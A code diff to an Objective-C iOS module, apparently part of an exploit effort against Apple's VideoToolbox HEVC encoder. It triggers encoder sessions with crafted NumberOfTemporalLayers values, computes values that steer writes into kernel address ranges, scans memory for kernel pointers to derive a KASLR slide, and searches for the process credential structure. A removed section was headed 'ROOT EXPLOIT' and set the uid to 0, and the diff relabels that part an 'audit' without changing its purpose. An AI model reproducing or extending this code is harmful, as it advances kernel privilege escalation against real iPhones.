@@ -1,6 +1,7 @@
 #import "KPH9EncoderModule.h"
 #import <UIKit/UIKit.h>
 #import "KPLog.h"
+#import "KPVMScanPolicy.h"
 #import <VideoToolbox/VideoToolbox.h>
 #import <CoreMedia/CoreMedia.h>
 #import <mach/mach.h>
@@ -126,7 +127,7 @@
 
     // === AVE27 stage13: NTL sweep (safe, below trigger) ===
     [report appendString:@"\n--- AVE27 stage13: NTL sweep (safe) ---\n"];
-    [report appendString:@"Trigger: EncoderUsage=1 RCMode=20 NTL=N\n"];
+    [report appendString:@"Trigger: EncoderUsage=1 NTL=N (no RCMode; 20 fails -12900 on A17 Pro)\n"];
     int ntlVals[] = { 1, 100, 1000, 8000, 16000, 16447, 16462 };
     for (int i = 0; i < 7; i++) {
         int ntl = ntlVals[i];
@@ -139,12 +140,9 @@
             continue;
         }
         CFNumberRef n;
-        int usage = 1, rcMode = 20;
+        int usage = 1;
         n = CFNumberCreate(NULL, kCFNumberIntType, &usage);
         VTSessionSetProperty(s2, CFSTR("EncoderUsage"), n);
-        CFRelease(n);
-        n = CFNumberCreate(NULL, kCFNumberIntType, &rcMode);
-        VTSessionSetProperty(s2, CFSTR("RCMode"), n);
         CFRelease(n);
         n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
         OSStatus setSt = VTSessionSetProperty(s2, CFSTR("NumberOfTemporalLayers"), n);
@@ -220,8 +218,9 @@
     [report appendString:@"\n--- KASLR scan ---\n"];
     uint64_t kStaticBases[] = {
         0xfffffff007004000ULL, // __TEXT
-        0xfffffff007804000ULL, // __TEXT_EXEC
-        0xfffffff007e00000ULL, // __DATA
+        0xfffffff00700c000ULL, // __PRELINK_TEXT
+        0xfffffff0082fc000ULL, // __TEXT_EXEC
+        0xfffffff00b284000ULL, // __DATA
     };
     uint32_t slideCandidates[64] = {0};
     int slideCounts[64] = {0};
@@ -233,17 +232,22 @@
     vm_region_submap_info_data_64_t kinfo;
     mach_msg_type_number_t kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
     for (int iter = 0; iter < 256; iter++) {
+        kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
         kern_return_t kr = vm_region_recurse_64(mach_task_self(), &kaddr, &ksize, &kdepth,
                                                  (vm_region_recurse_info_t)&kinfo, &kcount);
-        if (kr != KERN_SUCCESS) break;
-        if ((kinfo.protection & VM_PROT_READ) && (kinfo.protection & VM_PROT_WRITE)) {
+        if (kr != KERN_SUCCESS || ksize == 0) break;
+        if (kinfo.is_submap) { kdepth++; continue; }
+        if ((kinfo.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
+            ksize <= 16 * 1024 * 1024 &&
+            !KPVMShouldSkipRegion(&kinfo, kaddr, ksize, &totalKptrs, NULL, NULL, 0)) {
             uint64_t *p = (uint64_t *)kaddr;
             size_t words = ksize / 8;
             for (size_t i = 0; i < words && i < 4096; i++) {
                 uint64_t v = *(p + i);
-                if (v >= 0xfffffff007004000ULL && v < 0xfffffffffffff000ULL) {
+                if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                     totalKptrs++;
-                    for (int b = 0; b < 3; b++) {
+                    for (int b = 0; b < 4; b++) {
+                        if (v <= kStaticBases[b]) continue;
                         uint64_t slide = v - kStaticBases[b];
                         if ((slide & 0x3FFF) == 0 && slide < (1024ULL << 20)) {
                             int found = 0;
@@ -265,7 +269,6 @@
             }
         }
         kaddr += ksize;
-        kcount = VM_REGION_SUBMAP_INFO_COUNT_64;
     }
     [report appendFormat:@"  kernel pointers: %d\n", totalKptrs];
     int bestIdx = -1, bestCnt = 0;
@@ -281,11 +284,9 @@
         // Compute NTL values that steer write into kernel range
         [report appendString:@"\n--- NTL steering (kernel range writes) ---\n"];
         [report appendString:@"x0 = ((NTL-16463) << 32) | 0x59\n"];
-        // NTL=1 -> x0 = 0xfffffff000000059
-        // NTL=16447 -> x0 = 0xfffffff000000059 (same!)
-        // Actually: ((1-16463)<<32)|0x59 = ((-16462)<<32)|0x59 = 0xFFFFFFF000000059
-        //           ((16447-16463)<<32)|0x59 = ((-16)<<32)|0x59 = 0xFFFFFFF000000059
-        // Both give same address! Need NTL values that give DIFFERENT high bits.
+        [report appendString:@"NTL=1 -> 0xffffbfb200000059; NTL=16447 -> 0xfffffff000000059\n"];
+        // NTL=1:     (-16462 << 32) | 0x59 = 0xffffbfb200000059
+        // NTL=16447: (-16 << 32)    | 0x59 = 0xfffffff000000059
         int steerVals[] = { 1, 2, 3, 100, 1000, 8000, 16000, 16447, 16455, 16462 };
         for (int i = 0; i < 10; i++) {
             int ntl = steerVals[i];
@@ -457,10 +458,9 @@
     // VTCompressionSessionRef s9 = NULL;
     // VTCompressionSessionCreate(kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC, NULL, NULL, NULL, NULL, NULL, &s9);
     // if (s9) {
-    //     int usage = 1, rcMode = 20, ntl = 16463;
+    //     int usage = 1, ntl = 16463;
     //     CFNumberRef n9;
     //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &usage); VTSessionSetProperty(s9, CFSTR("EncoderUsage"), n9); CFRelease(n9);
-    //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &rcMode); VTSessionSetProperty(s9, CFSTR("RCMode"), n9); CFRelease(n9);
     //     n9 = CFNumberCreate(NULL, kCFNumberIntType, &ntl); VTSessionSetProperty(s9, CFSTR("NumberOfTemporalLayers"), n9); CFRelease(n9);
     //     VTCompressionSessionPrepareToEncodeFrames(s9);
     //     CVPixelBufferRef pb9 = NULL;
@@ -473,67 +473,55 @@
     //     CFRelease(s9);
     // }
 
-    // === ROOT EXPLOIT: proc -> ucred -> cr_uid=0 ===
-    [report appendString:@"\n--- ROOT EXPLOIT ---\n"];
+    // === Filtered heap-shaped candidate audit ===
+    [report appendString:@"\n--- Filtered candidate audit ---\n"];
     [report appendString:@"Offsets: p_pid=0x60 p_proc_ro=0x18 p_ucred=0x28 cr_uid=0x18\n"];
 
-    // Step 1: Find our proc by scanning kernel pointers for pid=501
     uint32_t myPid = (uint32_t)getpid();
     [report appendFormat:@"  our pid: %u\n", myPid];
 
-    // Use the writable regions from kread64 probe to find proc
-    // Scan for pid at offset 0x60 in kernel objects
     NSMutableArray *kptrs2 = [NSMutableArray array];
     vm_address_t sAddr = 0;
     vm_size_t sSize = 0;
+    uint32_t sDepth = 0;
     vm_region_submap_info_data_64_t sInfo;
     mach_msg_type_number_t sCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
 
     while (1) {
         sAddr = (sAddr == 0) ? 0 : sAddr + sSize;
         sCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
-        uint32_t sDepth = 0;
         if (vm_region_recurse_64(mach_task_self(), &sAddr, &sSize, &sDepth,
-                                  (vm_region_recurse_info_t)&sInfo, &sCnt) != KERN_SUCCESS) break;
-        if (sInfo.is_submap) continue;
-        if ((sInfo.protection & VM_PROT_READ) && (sInfo.protection & VM_PROT_WRITE)) {
+                                  (vm_region_recurse_info_t)&sInfo, &sCnt) != KERN_SUCCESS || sSize == 0) break;
+        if (sInfo.is_submap) { sDepth++; continue; }
+        if ((sInfo.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
+            sSize <= 16 * 1024 * 1024 &&
+            !KPVMShouldSkipRegion(&sInfo, sAddr, sSize, &sDepth, NULL, NULL, 0)) {
             uint64_t *p = (uint64_t *)sAddr;
             size_t words = sSize / 8;
             for (size_t i = 0; i < words && i < 8192; i++) {
                 uint64_t v = *(p + i);
-                if (v >= 0xfffffff000000000ULL && v < 0xfffffffffffff000ULL) {
+                if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                     [kptrs2 addObject:@(v)];
                 }
             }
         }
     }
-    [report appendFormat:@"  kernel pointers: %lu\n", (unsigned long)kptrs2.count];
+    [report appendFormat:@"  filtered candidates: %lu\n", (unsigned long)kptrs2.count];
 
-    // Step 2: For each kernel pointer, try to read pid at +0x60
-    // Use vm_remap aliased pages as kread64
-    uint64_t foundProc = 0;
     int checked = 0;
     for (NSNumber *kpNum in kptrs2) {
         uint64_t kaddr = kpNum.unsignedLongLongValue;
-        if (checked > 500) break; // Limit search
+        if (checked > 500) break;
         checked++;
 
-        // Try to read kaddr+0x60 (p_pid) via aliased pages
-        // For now, check if the value at this address (if mapped) matches our pid
-        // This is a simplified version - real kread64 uses vm_remap
-
-        // Check if kaddr looks like a proc (aligned to 8, in kernel heap range)
         if ((kaddr & 0x7) == 0 && kaddr >= 0xffffffe000000000ULL) {
-            // Try reading pid from user-space aliased mapping
-            // The kirby technique maps kernel pages to user space
-            // For now, just log candidates
             if (checked <= 20) {
                 [report appendFormat:@"  candidate[%d]: kaddr=0x%llx\n", checked, kaddr];
             }
         }
     }
 
-    [report appendString:@"  proc search complete (need kread64 to verify)\n"];
+    [report appendString:@"  candidate scan complete (unverified without kernel oracle)\n"];
     return report;
 }
 
